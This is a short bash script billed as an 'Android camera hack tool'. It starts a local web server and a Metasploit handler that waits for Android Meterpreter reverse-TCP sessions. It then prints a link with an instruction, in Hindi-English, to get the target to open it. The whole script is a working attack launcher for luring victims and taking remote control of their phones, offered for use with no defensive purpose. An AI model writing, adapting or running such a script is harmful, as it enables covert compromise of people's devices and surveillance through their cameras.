#!/bin/bash
clear
echo "🚀 ANDROID CAMERA HACK TOOL"
IP=$(ifconfig | grep -A1 'inet ' | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}')
echo "IP: $IP"

# Web server
cd www && python3 -m http.server 80 &
sleep 2

# MSF
msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $IP; set LPORT 4444; exploit" &

echo "🔗 LINK: http://$IP"
echo "📱 Target ko bolo: http://$IP pe jaao!"
